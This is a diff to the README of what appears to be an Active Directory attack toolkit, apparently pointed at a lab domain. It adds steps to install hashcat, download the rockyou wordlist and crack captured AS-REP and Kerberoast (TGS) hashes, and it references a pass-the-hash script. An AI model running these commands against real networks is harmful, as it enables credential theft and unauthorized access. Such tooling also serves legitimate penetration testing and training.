@@ -138,15 +138,22 @@ python3 pth.py --dc-ip 192.168.56.10 --domain psychosec.local -u admin.helpdesk 
 ```
 
 ### Cracking captured hashes
+Install hashcat and download rockyou wordlist(many common passwords):
 ```bash
-# AS-REP hashes
-hashcat -m 18200 asrep_hashes.txt /path/to/wordlist.txt
-
-# TGS hashes
-hashcat -m 13100 tgs_hashes.txt /path/to/wordlist.txt
+sudo apt update && sudo apt install hashcat -y
+wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
 ```
 
-## Output
+Crack hashes:
+```bash
+# AS-REP hashes (Hashcat mode 18200)
+hashcat -m 18200 asrep_hashes.txt rockyou.txt --force
+
+# TGS hashes (Hashcat mode 13100)
+hashcat -m 13100 tgs_hashes.txt rockyou.txt --force
+```
+
+## Outputs
 
 - `enum_results.json` — full enumeration data
 - `asrep_hashes.txt` — AS-REP hashes (Hashcat mode 18200)
